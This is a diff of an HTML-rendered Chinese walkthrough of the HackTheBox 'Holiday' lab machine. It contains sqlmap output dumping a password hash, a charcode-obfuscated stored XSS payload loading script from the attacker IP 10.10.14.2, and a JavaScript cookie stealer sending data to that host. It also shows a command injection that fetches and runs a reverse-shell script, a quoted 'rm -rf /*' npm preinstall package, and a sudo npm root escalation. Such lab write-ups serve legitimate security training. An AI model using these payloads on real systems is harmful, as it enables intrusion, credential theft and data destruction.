+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">5</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">RickA</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">recognized</span> <span class="n">possible</span> <span class="n">password</span> <span class="n">hashes</span> <span class="ow">in</span> <span class="n">column</span> <span class="sh">'</span><span class="s">password</span><span class="sh">'</span>
+<span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">store</span> <span class="n">hashes</span> <span class="n">to</span> <span class="n">a</span> <span class="n">temporary</span> <span class="nb">file</span> <span class="k">for</span> <span class="n">eventual</span> <span class="n">further</span> <span class="n">processing</span> <span class="k">with</span> <span class="n">other</span> <span class="n">tools</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">n</span>
+<span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">crack</span> <span class="n">them</span> <span class="n">via</span> <span class="n">a</span> <span class="n">dictionary</span><span class="o">-</span><span class="n">based</span> <span class="n">attack</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="o">/</span><span class="n">q</span><span class="p">]</span> <span class="n">n</span>
+<span class="n">Database</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">current</span><span class="o">&gt;</span>
+<span class="n">Table</span><span class="p">:</span> <span class="n">users</span>
+<span class="p">[</span><span class="mi">1</span> <span class="n">entry</span><span class="p">]</span>
+<span class="o">+----+--------+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="nb">id</span> <span class="o">|</span> <span class="n">active</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+----+--------+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">1</span>      <span class="o">|</span> <span class="n">RickA</span>    <span class="o">|</span> <span class="n">fdc8cd4cff2c19e0d1022e78481ddf36</span> <span class="o">|</span>
+<span class="o">+----+--------+----------+----------------------------------+</span>
 </code></pre></div></div>
 
 <h2 id="储存型xss">储存型XSS</h2>
@@ -788,13 +788,13 @@ Table: users
 <p>其中的CHARCODE_HERE由<code class="language-plaintext highlighter-rouge">document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');</code>转化成CharCode得到</p>
 
 <p>python代码如下：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; payload='''document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');'''
-&gt;&gt;&gt; ','.join([str(ord(c)) for c in payload])
-'100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
-12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span><span class="o">=</span><span class="sh">'''</span><span class="s">document.write(</span><span class="sh">'</span><span class="s">&lt;script src=</span><span class="sh">"</span><span class="s">http://10.10.14.2/yyj.js</span><span class="sh">"</span><span class="s">&gt;&lt;/script&gt;</span><span class="sh">'</span><span class="s">);</span><span class="sh">'''</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">str</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">])</span>
+<span class="sh">'</span><span class="s">100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
+12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59</span><span class="sh">'</span>
 </code></pre></div></div>
 <p>最后得到的payload：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"</span><span class="nt">&gt;</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 80
 listening on [any] 80 ...
@@ -814,9 +814,9 @@ Host: 10.10.14.2
 Serving HTTP on :: port 80 (http://[::]:80/) ...
 </code></pre></div></div>
 <p>yyj.js文件内容：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.addEventListener('DOMContentLoaded', function(e) {
-    window.location = "http://10.10.14.2:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
-})
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMContentLoaded</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.2:81/?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">encodeURI</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookie</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">)</span>
+<span class="p">})</span>
 </code></pre></div></div>
 <p>然后在监听81端口以及80端口的yyj.js文件可以正常访问的情况下，重新提交最终的payload</p>
 
@@ -841,8 +841,8 @@ Serving HTTP on :: port 80 (http://[::]:80/) ...
 
 <p>经测试，用url编码之后的<code class="language-plaintext highlighter-rouge">&amp;</code>拼接语句可触发命令注入漏洞<code class="language-plaintext highlighter-rouge">/admin/export?table=users%26id</code></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
-1|RickA|fdc8cd4cff2c19e0d1022e78481ddf36|1
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">algernon</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">algernon</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">algernon</span><span class="p">)</span>
+<span class="mi">1</span><span class="o">|</span><span class="n">RickA</span><span class="o">|</span><span class="n">fdc8cd4cff2c19e0d1022e78481ddf36</span><span class="o">|</span><span class="mi">1</span>
 </code></pre></div></div>
 
 <p>现在注入点有了，但是存在白名单限制，怎么去bypass呢？可以先在本机起一个http服务，把反弹shell的脚本挂在上面，然后用wget命令访问十进制或者六进制转换后的ip地址+文件名，再用bash命令执行此文件。</p>
@@ -875,34 +875,34 @@ listening on [any] 2333 ...
 
 <p>并且web服务器也收到信号</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - <span class="o">[</span>18/Apr/2023 22:05:48] <span class="s2">"GET /rev HTTP/1.1"</span> 200 -
 </code></pre></div></div>
 <p>通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了
 <img src="/images/hackthebox/holiday/13.png" alt="" /></p>
 
 <p>访问<code class="language-plaintext highlighter-rouge">/admin/export?table=b%26bash+rev</code>执行反弹shell命令，成功得到了webshell</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 2333
-listening on [any] 2333 ...
-connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
-bash: cannot set terminal process group (1137): Inappropriate ioctl for device
-bash: no job control in this shell
-algernon@holiday:~/app$ whoami
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\1</span>4530&gt;nc <span class="nt">-lnvp</span> 2333
+listening on <span class="o">[</span>any] 2333 ...
+connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.25] 46894
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1137<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+algernon@holiday:~/app<span class="nv">$ </span><span class="nb">whoami
 whoami
-algernon
-algernon@holiday:~/app$
+</span>algernon
+algernon@holiday:~/app<span class="err">$</span>
 </code></pre></div></div>
 
 <p>成功拿到第一个flag</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/app$ cd ..
-cd ..
-algernon@holiday:~$ ls
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/app<span class="nv">$ </span><span class="nb">cd</span> ..
+<span class="nb">cd</span> ..
+algernon@holiday:~<span class="nv">$ </span><span class="nb">ls
 ls
-app
+</span>app
 user.txt
-algernon@holiday:~$ cat user.txt
-cat user.txt
+algernon@holiday:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
 e9451...........................
 </code></pre></div></div>
 
@@ -923,61 +923,61 @@ User algernon may run the following commands on holiday:
 
 <p>谷歌一下npm install dangerous，大概思路是nodejs包是一个叫<code class="language-plaintext highlighter-rouge">package.json</code>的文件，其格式如下：</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-  "name": "rimrafall",
-  "version": "1.0.0",
-  "description": "rm -rf /* # DO NOT INSTALL THIS",
-  "main": "index.js",
-  "scripts": {
-    "preinstall": "rm -rf /* /.*"
-  },
-  "keywords": [
-    "rimraf",
-    "rmrf"
-  ],
-  "author": "João Jerónimo",
-  "license": "ISC"
-}
-</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rimrafall"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rm -rf /* # DO NOT INSTALL THIS"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"main"</span><span class="p">:</span><span class="w"> </span><span class="s2">"index.js"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"preinstall"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rm -rf /* /.*"</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"keywords"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"rimraf"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"rmrf"</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="s2">"João Jerónimo"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"license"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ISC"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 <p>其中<code class="language-plaintext highlighter-rouge">preinstall</code>中的预安装命令会在安装这个包之前执行。这也是为什么npm install存在危险。在这台靶机中我们需要创建一个文件夹，再创建一个<code class="language-plaintext highlighter-rouge">package.json</code>来模拟nodejs应用，node包中需要有name和version这两个参数：</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cat package.json
-cat package.json
-{
-  "name": "root_please",
-  "version": "1.0.0",
-  "scripts": {
-    "preinstall": "/bin/bash"
-  }
-}
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj<span class="nv">$ </span><span class="nb">cat </span>package.json
+<span class="nb">cat </span>package.json
+<span class="o">{</span>
+  <span class="s2">"name"</span>: <span class="s2">"root_please"</span>,
+  <span class="s2">"version"</span>: <span class="s2">"1.0.0"</span>,
+  <span class="s2">"scripts"</span>: <span class="o">{</span>
+    <span class="s2">"preinstall"</span>: <span class="s2">"/bin/bash"</span>
+  <span class="o">}</span>
+<span class="o">}</span>
 </code></pre></div></div>
 <p>在package.json的上一级目录yyj执行<code class="language-plaintext highlighter-rouge">sudo npm i yyj/ --unsafe</code>就能获取root权限了，随后拿到root权限下的flag</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cd ..
-cd ..
-algernon@holiday:~$ ls
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj<span class="nv">$ </span><span class="nb">cd</span> ..
+<span class="nb">cd</span> ..
+algernon@holiday:~<span class="nv">$ </span><span class="nb">ls
 ls
-app
+</span>app
 node_modules
 user.txt
 yyj
-algernon@holiday:~$ sudo npm i yyj/ --unsafe
-sudo npm i yyj/ --unsafe
+algernon@holiday:~<span class="nv">$ </span><span class="nb">sudo </span>npm i yyj/ <span class="nt">--unsafe</span>
+<span class="nb">sudo </span>npm i yyj/ <span class="nt">--unsafe</span>
 
-&gt; root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
-&gt; /bin/bash
+<span class="o">&gt;</span> root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
+<span class="o">&gt;</span> /bin/bash
 
+<span class="nb">ls
+</span>package.json
+<span class="nb">whoami
+</span>root
+python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+root@holiday:~/node_modules/.staging/root_please-f4b1cb59# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@holiday:/root# <span class="nb">ls
 ls
-package.json
-whoami
-root
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-root@holiday:~/node_modules/.staging/root_please-f4b1cb59# cd /root
-cd /root
-root@holiday:/root# ls
-ls
-root.txt
-root@holiday:/root# cat root.txt
-cat root.txt
+</span>root.txt
+root@holiday:/root# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
 592d9c91924793c4c8b8ed..........
 </code></pre></div></div>
 <h2 id="小结">小结</h2>
